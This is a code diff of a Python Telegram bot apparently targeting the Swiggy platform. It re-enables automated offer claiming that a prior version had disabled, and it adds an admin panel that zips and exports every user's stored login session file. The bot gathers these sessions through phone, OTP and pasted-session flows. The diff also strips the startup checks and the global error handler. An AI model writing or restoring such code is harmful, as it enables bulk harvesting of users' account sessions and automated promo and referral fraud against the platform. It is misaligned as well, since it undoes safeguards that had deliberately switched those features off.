-async def night_cash_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "Automated offer claiming is disabled in this deployment scaffold."
-    )
 
 async def night_cash_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    if query:
-        await query.answer("Automated offer claiming is disabled.", show_alert=True)
+    await query.answer()
+    data = query.data or ""
+    if data.startswith("ln_pick_"):
+        _, _, day_s, oid_s = data.split("_")
+        session = get_session(update.effective_chat.id)
+        if not session:
+            await query.edit_message_text("❌ Session lost.")
+            return
+        res = await ln_claim_offer(session, int(day_s), int(oid_s))
+        if res.get("ok"):
+            await query.edit_message_text("✅ Offer claimed successfully!")
+        else:
+            await query.edit_message_text("❌ Claim failed.")
 
-async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "Automated bulk referral processing is disabled in this deployment scaffold."
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ADMIN PANEL
+# ─────────────────────────────────────────────────────────────────────────────
+
+async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.effective_user or not is_admin(update.effective_user.id):
+        await update.message.reply_text("⛔ Admin only.")
+        return
+    await update.message.reply_text(
+        "🛠 *Admin Panel*", parse_mode=ParseMode.MARKDOWN,
+        reply_markup=admin_panel_inline(),
     )
 
 
-# Render Web Service health endpoint. This is a health check, not a keep-alive bypass.
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-from threading import Thread
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not update.effective_user or not is_admin(update.effective_user.id):
+        await query.answer("⛔ Admin only.", show_alert=True)
+        return
+    await query.answer()
 
-class HealthHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path not in ("/", "/health", "/healthz", "/favicon.ico"):
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b"not found")
-            return
-        body = json.dumps({
-            "ok": True,
-            "service": "swiggy-telegram-bot",
-            "status": "running",
-            "time": datetime.now(timezone.utc).isoformat(),
-        }).encode("utf-8")
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json; charset=utf-8")
-        self.send_header("Content-Length", str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
+    action = (query.data or "").replace("admin_", "")
 
-    def log_message(self, format, *args):
-        log.info("health: " + format, *args)
+    if action == "panel":
+        await query.edit_message_text(
+            "🛠 *Admin Panel*", parse_mode=ParseMode.MARKDOWN,
+            reply_markup=admin_panel_inline(),
+        )
+        return
 
-def start_health_server():
-    port = int(os.getenv("PORT", "10000"))
-    server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
-    Thread(target=server.serve_forever, name="health-server", daemon=True).start()
-    log.info("Health server listening on port %s", port)
+    if action == "back":
+        chat_id = update.effective_chat.id
+        await query.edit_message_text(
+            "⚡ Main Menu", reply_markup=main_menu_inline(chat_id)
+        )
+        return
 
+    if action == "export_all":
+        await _admin_export_all(query)
+        return
 
+    if action == "stats":
+        total_users = len(BOT_STATS.get("users", {}))
+        active_sessions = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".json")])
+        claims = len(BOT_STATS.get("claims", []))
+        text = (
+            "📊 *Bot Stats*\n\n"
+            f"👥 Total users        : {total_users}\n"
+            f"💾 Active sessions    : {active_sessions}\n"
+            f"🎁 Recorded claims    : {claims}\n"
+            f"📁 Sessions dir       : `{SESSIONS_DIR}`"
+        )
+        await query.edit_message_text(
+            text, parse_mode=ParseMode.MARKDOWN,
+            reply_markup=admin_panel_inline(),
+        )
+        return
 
-async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    error = context.error
-    log.error("Unhandled update error: %s", error, exc_info=error)
-    if isinstance(update, Update) and update.effective_message:
-        try:
-            await update.effective_message.reply_text(
-                "⚠️ Something went wrong while handling that action. Please try again."
+    if action == "users":
+        users = BOT_STATS.get("users", {})
+        if not users:
+            await query.edit_message_text(
+                "👥 No users recorded.", reply_markup=admin_panel_inline()
             )
+            return
+        lines = ["👥 *Users*", ""]
+        for uid, info in list(users.items())[:50]:
+            uname = f"@{info.get('username')}" if info.get("username") else (info.get("name") or "-")
+            has_session = "💾" if os.path.isfile(_session_path(int(uid))) else "  "
+            lines.append(f"{has_session} `{uid}` — {uname}")
+        if len(users) > 50:
+            lines.append(f"... +{len(users) - 50} more")
+        await query.edit_message_text(
+            "\n".join(lines), parse_mode=ParseMode.MARKDOWN,
+            reply_markup=admin_panel_inline(),
+        )
+        return
+
+    if action == "cleanup":
+        removed = _purge_expired_sessions()
+        await query.edit_message_text(
+            f"🧹 Purged {removed} expired session file(s).",
+            reply_markup=admin_panel_inline(),
+        )
+        return
+
+
+async def _admin_export_all(query):
+    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".json")]
+    if not files:
+        await query.edit_message_text(
+            "📦 No session files to export.", reply_markup=admin_panel_inline()
+        )
+        return
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for fname in files:
+            fpath = os.path.join(SESSIONS_DIR, fname)
+            try:
+                zf.write(fpath, arcname=fname)
+            except Exception as e:
+                log.warning(f"zip skip {fname}: {e}")
+    buf.seek(0)
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    await query.message.reply_document(
+        document=buf,
+        filename=f"all_sessions_{ts}.zip",
+        caption=f"📦 Exported {len(files)} session file(s).",
+    )
+
+
+def _purge_expired_sessions() -> int:
+    now = datetime.now(timezone.utc).timestamp()
+    removed = 0
+    for fname in os.listdir(SESSIONS_DIR):
+        if not fname.endswith(".json"):
+            continue
+        path = os.path.join(SESSIONS_DIR, fname)
+        try:
+            with open(path, "r") as f:
+                payload = json.load(f)
+            saved_at = float(payload.get("saved_at") or 0)
+            if now - saved_at > SESSION_TTL_SECONDS:
+                os.remove(path)
+                removed += 1
         except Exception:
-            log.exception("Could not send error notification")
+            try:
+                os.remove(path)
+                removed += 1
+            except Exception:
+                pass
+    return removed
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ROUTER
+# ─────────────────────────────────────────────────────────────────────────────
+
+async def free_text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.user_data.get("awaiting_phone"):
+        return await phone_received(update, context)
+    if context.user_data.get("awaiting_session"):
+        return await session_received(update, context)
+    if user_pending_otp.get(update.effective_chat.id):
+        return await otp_received(update, context)
+
 
 def main():
-    if not BOT_TOKEN:
-        raise RuntimeError("Set BOT_TOKEN as an environment variable before starting the bot.")
-    if not ADMIN_IDS:
-        raise RuntimeError("Set ADMIN_IDS as comma-separated Telegram numeric user IDs.")
-    start_health_server()
     app = Application.builder().token(BOT_TOKEN).concurrent_updates(MAX_CONCURRENT_UPDATES).build()
 
     app.add_handler(CommandHandler("start", start_cmd))
-    app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler("run", run_cmd))
-    app.add_handler(CommandHandler("logout", logout_cmd))
     app.add_handler(CommandHandler("admin", admin_cmd))
-    app.add_handler(CommandHandler("stats", admin_stats_cmd))
-    app.add_handler(CommandHandler("users", admin_users_cmd))
-    app.add_handler(CommandHandler("maintenance", admin_maintenance_cmd))
-    app.add_handler(CommandHandler("broadcast", admin_broadcast_cmd))
-    app.add_handler(CommandHandler("cancel", cancel_cmd))
-
     app.add_handler(CommandHandler("login", login_cmd))
-    app.add_handler(CommandHandler("session", session_cmd))
 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_broadcast_text), group=0)
-    app.add_handler(MessageHandler(filters.Regex(r"^(⚡ RUN \(10 links\)|Late Night Cash|📊 Status|🔐 Login|📤 Export JSON|📤 Session|🚪 Logout)$"), button_handler), group=1)
-    app.add_handler(CallbackQueryHandler(inline_callback_handler, pattern=r"^(ui:|admin:)"))
+    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^admin_"))
     app.add_handler(CallbackQueryHandler(night_cash_callback, pattern=r"^ln_pick_"))
-    app.add_error_handler(global_error_handler)
+    app.add_handler(CallbackQueryHandler(menu_callback, pattern=r"^menu_"))
 
-    print("🤖 Bot started successfully with Export JSON button and styled keyboard!")
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, free_text_router))
+
+    print("🤖 Bot started — inline keyboards + admin panel online.")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
